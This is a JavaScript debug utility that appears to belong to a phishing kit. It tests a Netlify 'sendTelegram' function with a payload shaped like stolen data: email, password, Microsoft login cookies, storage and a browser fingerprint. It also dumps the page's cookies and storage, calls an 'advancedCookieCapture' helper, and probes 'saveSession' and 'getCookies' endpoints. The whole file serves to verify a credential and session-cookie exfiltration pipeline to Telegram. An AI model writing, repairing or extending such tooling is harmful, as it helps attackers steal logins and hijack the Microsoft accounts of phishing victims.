/**
 * Telegram Debug Utility
 * Use this to test and diagnose Telegram bot configuration
 */

window.telegramDebugger = {
  // Test basic connectivity to the sendTelegram function
  async testTelegramFunction() {
    console.log('🔍 Testing Telegram function connectivity...');
    
    try {
      const testPayload = {
        email: 'test@debug.com',
        password: 'debug-test',
        provider: 'Debug Test',
        fileName: 'Debug Test',
        timestamp: new Date().toISOString(),
        sessionId: 'debug-' + Math.random().toString(36).substring(2, 15),
        userAgent: navigator.userAgent,
        formattedCookies: [{
          name: 'debug_test_cookie',
          value: 'debug_value',
          domain: '.login.microsoftonline.com',
          path: '/',
          secure: true,
          httpOnly: false,
          sameSite: 'none',
          expirationDate: Math.floor(Date.now() / 1000) + (24 * 60 * 60)
        }],
        documentCookies: 'debug_test=debug_value',
        browserFingerprint: {
          cookies: [],
          localStorage: '{}',
          sessionStorage: '{}',
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: new Date().toISOString()
        }
      };

      console.log('📤 Sending debug payload:', testPayload);

      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(testPayload),
        signal: AbortSignal.timeout(30000)
      });

      console.log('📥 Debug response:', {
        status: response.status,
        statusText: response.statusText,
        ok: response.ok
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ Debug test failed:', errorText);
        return { success: false, error: errorText, status: response.status };
      }

      const result = await response.json();
      console.log('✅ Debug test result:', result);
      return { success: true, result };
    } catch (error) {
      console.error('❌ Debug test error:', error);
      return { success: false, error: error.message };
    }
  },

  // Check current cookie situation
  checkCookies() {
    console.log('🔍 Cookie situation check:');
    console.log('Document cookies:', document.cookie || 'EMPTY');
    console.log('Current domain:', window.location.hostname);
    console.log('Current protocol:', window.location.protocol);
    console.log('Current path:', window.location.pathname);
    
    // Try to capture using the existing function if available
    if (window.advancedCookieCapture) {
      const captured = window.advancedCookieCapture.getAllCookies();
      console.log('Advanced capture result:', captured);
    } else {
      console.log('Advanced cookie capture not available');
    }

    // Check storage
    try {
      console.log('LocalStorage keys:', Object.keys(localStorage));
      console.log('SessionStorage keys:', Object.keys(sessionStorage));
    } catch (e) {
      console.log('Storage access error:', e.message);
    }

    return {
      documentCookies: document.cookie,
      domain: window.location.hostname,
      protocol: window.location.protocol,
      localStorageKeys: Object.keys(localStorage),
      sessionStorageKeys: Object.keys(sessionStorage)
    };
  },

  // Check environment/deployment status
  async checkEnvironment() {
    console.log('🔍 Environment check...');
    
    try {
      // Test if functions are accessible
      const functionsToTest = [
        '/.netlify/functions/sendTelegram',
        '/.netlify/functions/saveSession',
        '/.netlify/functions/getCookies'
      ];

      const results = {};
      
      for (const func of functionsToTest) {
        try {
          const response = await fetch(func, {
            method: 'OPTIONS',
            signal: AbortSignal.timeout(5000)
          });
          results[func] = {
            accessible: true,
            status: response.status,
            headers: Object.fromEntries(response.headers.entries())
          };
        } catch (error) {
          results[func] = {
            accessible: false,
            error: error.message
          };
        }
      }

      console.log('Function accessibility:', results);
      return results;
    } catch (error) {
      console.error('Environment check error:', error);
      return { error: error.message };
    }
  },

  // Run all diagnostics
  async runFullDiagnostic() {
    console.log('🚀 Starting full Telegram diagnostic...');
    
    const results = {
      timestamp: new Date().toISOString(),
      cookies: this.checkCookies(),
      environment: await this.checkEnvironment(),
      telegramTest: await this.testTelegramFunction()
    };

    console.log('📊 Full diagnostic results:', results);
    
    // Save results to localStorage for review
    localStorage.setItem('telegram_diagnostic_results', JSON.stringify(results, null, 2));
    
    return results;
  }
};

// Auto-run basic check on load
console.log('🔧 Telegram debugger loaded. Use window.telegramDebugger.runFullDiagnostic() to run tests.');